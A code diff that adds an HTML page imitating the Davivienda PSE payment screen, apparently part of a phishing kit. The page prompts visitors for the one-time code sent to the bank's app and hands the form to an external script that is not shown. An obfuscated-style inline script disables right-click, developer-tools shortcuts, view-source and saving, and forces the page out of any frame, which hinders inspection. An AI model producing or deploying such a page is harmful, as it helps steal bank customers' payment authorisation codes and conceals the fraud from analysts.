@@ -1,0 +1,26 @@
+<!doctype html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><meta name="theme-color" content="#E30613"><title>PSE - Davivienda</title><link rel="icon" type="image/png" href="img/logo-davivienda2.png"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet"><link rel="stylesheet" href="login.css"></head><body class="bodyPersonas bodyOtp"><div class="dav-wrapper"><header class="dav-header"><div class="dav-header-logo-wrap"><img src="img/logo-davivienda2.png" alt="Davivienda" class="dav-logo"></div><div class="dav-header-info"><span>Bienvenido(a)</span><br><span id="dav-fecha">Sábado, 10 de octubre de 2026, 05:56 p. m.</span><br><span>Código único CUS: <strong id="dav-cus">000000000</strong></span></div></header><section class="dav-section dav-section-otp"><div class="dav-contenedorTabla"><h1 align="center" class="dav-h1 dav-h1-otp">Pago PSE</h1><div class="dav-mensaje-error hidden" id="davMensajeError"><span class="dav-error-icono"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="#cd7f19"/><path d="M12 7v6" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16.5" r="1.2" fill="#ffffff"/></svg> </span><span class="dav-error-texto">Acceso denegado, Por favor revise los valores ingresados</span></div><div class="dav-otp-contenido"><p class="dav-otp-instruccion">Encuentre el código en las<br>🔔 Notificaciones de la App<br>Davivienda e ingréselo aquí:</p><form id="davFormOtp" autocomplete="off"><div class="dav-otp-input-wrap"><input id="dav-otp-codigo" class="dav-otp-input" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="off" required></div><p class="dav-otp-aviso"><strong>Por seguridad el código llegará a la App. Descárguela para recibirlo.</strong></p><p class="dav-otp-aviso">¿Tiene la App y no le llega el código? <strong>Contáctenos a través del botón "Necesita ayuda"</strong></p><p class="dav-otp-aviso">Para realizar su pago, haga clic <strong>una sola vez</strong> en el botón efectuar pago</p><div class="dav-botones"><button type="submit" class="dav-btn-continuar" id="davBtnEfectuar">Efectuar pago</button> <button type="button" class="dav-btn-cancelar" id="davBtnCancelar">Cancelar</button></div></form></div></div></section><footer class="dav-footer"><div class="dav-footer-inner"><p class="dav-footer-text">Banco Davivienda S.A. Todos los derechos reservados 2026.</p><div class="dav-footer-logos"><img src="img/Vigilado.png" alt="Vigilado Superintendencia Financiera de Colombia" class="dav-vigilado"></div></div></footer></div><script src="otp.js"></script>
+<script>
+(function(){
+'use strict';
+var _0xa1=0;
+document.addEventListener('touchend',function(_0xb2){
+var _0xc3=new Date().getTime();
+if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
+_0xa1=_0xc3;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
+document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
+document.addEventListener('keydown',function(_0xf6){
+var _0xg7=(_0xf6.key||'').toLowerCase();
+var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
+var _0xi9=_0xf6.shiftKey;
+if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
+});
+document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xk1){document.body.innerHTML='';}
+})();
+</script>
+</body></html>
